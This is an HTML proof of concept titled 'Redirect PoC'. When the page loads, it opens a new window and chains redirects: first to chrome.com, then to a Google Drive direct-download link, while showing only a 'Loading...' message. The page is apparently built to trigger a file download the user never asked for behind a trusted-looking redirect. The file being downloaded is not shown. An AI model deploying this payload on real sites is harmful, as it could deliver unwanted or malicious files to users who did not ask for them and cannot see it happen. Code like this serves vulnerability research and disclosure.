<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirect PoC</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        console.log("Redirecting to:", urls[index]);
        w.location.replace(urls[index]);

        setTimeout(() => {
          chainRedirect(w, urls, index + 1);
        }, 400);
      }
    }

    function startRedirect() {
      let w = window.open("");

      setTimeout(() => {
        chainRedirect(w, [
          "https://chrome.com",
          "https://drive.usercontent.google.com/download?id=1Ky6ckxHgrE6HUlAq9g842YXa2nyGO5pU&export=download&authuser=0&confirm=t&uuid=3f3bdd65-f5df-41f2-a3db-b3c19d4597d9&at=AGN2oQ3FkHMmkn5pRs1cbEG3gWGI:1773918923543"
        ]);
      }, 300);
    }
  </script>
</head>

<body onload="startRedirect()">
  <h3>Loading...</h3>
</body>
</html>
